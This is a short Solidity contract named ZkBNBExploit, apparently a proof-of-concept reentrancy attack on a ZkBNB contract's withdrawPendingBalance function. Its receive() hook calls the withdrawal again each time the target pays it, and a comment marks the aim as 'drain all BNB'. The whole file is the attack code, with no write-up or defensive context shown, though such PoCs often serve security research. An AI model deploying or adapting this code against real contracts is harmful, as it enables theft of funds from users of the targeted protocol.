// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;

import "hardhat/console.sol";

interface ITarget {
    function withdrawPendingBalance(address payable _owner, address _token, uint128 _amount) external;
}

contract ZkBNBExploit {
    ITarget public target;

    constructor(ITarget _target) {
        target = _target;
    }

    fallback() external payable {
    }

    receive() external payable {
        // console.log("receive, balance: %s", address(this).balance / 1 ether);
        // console.log(msg.sender);
        // console.log(msg.value);
        uint amount = address(target).balance;
        // console.log("amount: %s", amount / 1 ether);
        // console.log("msg.sender: %s", msg.sender);
        if (amount == 0 || msg.sender != address(target)) {
            return;
        }
        // drain all BNB
        if (amount > msg.value) {
            amount = msg.value;
        }
        target.withdrawPendingBalance(payable(address(this)), address(0), uint128(amount));
    }
}
